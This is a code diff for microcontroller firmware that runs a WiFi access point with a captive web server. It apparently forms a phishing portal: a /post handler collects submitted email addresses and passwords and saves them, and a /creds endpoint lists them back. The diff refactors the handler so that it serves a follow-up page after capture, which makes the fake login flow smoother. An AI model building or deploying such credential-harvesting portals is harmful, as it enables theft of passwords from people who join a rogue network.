@@ -111,6 +111,21 @@ void getCredentials() {
   return pageContent;
 }
 
+void handlePost() {
+  if (webServer.hasArg("email") && webServer.hasArg("password")) {
+    String email = input("email");        // Sanitize the email input
+    String password = input("password");  // Sanitize the password input
+    saveCredentials(email, password);     // Save the sanitized credentials
+
+    // Serve the post.html file
+    File file = SPIFFS.open("/post.html", "r");
+    webServer.send(200, "text/html", file.readString());
+    file.close();    
+  } else {
+    webServer.send(400, "text/html", "Invalid input. Please provide email and password.");
+  }
+}
+
 void setup() {
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
@@ -124,16 +139,7 @@ void setup() {
     return;
   }
 
-  webServer.on("/post", HTTP_POST, []() {
-    if (webServer.hasArg("email") && webServer.hasArg("password")) {
-      String email = input("email");        // Sanitize the email input
-      String password = input("password");  // Sanitize the password input
-      saveCredentials(email, password);     // Save the sanitized credentials
-      webServer.send(200, "text/html", "Credentials saved successfully!");
-    } else {
-      webServer.send(400, "text/html", "Invalid input. Please provide email and password.");
-    }
-  });
+  webServer.on("/post", HTTP_POST, handlePost);
   webServer.on("/creds", HTTP_GET, []() {
     String pageContent = getCredentials();
     webServer.send(200, "text/html", pageContent);
@@ -154,6 +160,7 @@ void setup() {
     file.close();
   });
 
+  // Serve the main page
   webServer.onNotFound([]() {
     String path = webServer.uri();
     if (path == "/" || !path.endsWith(".js") && !path.endsWith(".css")) {
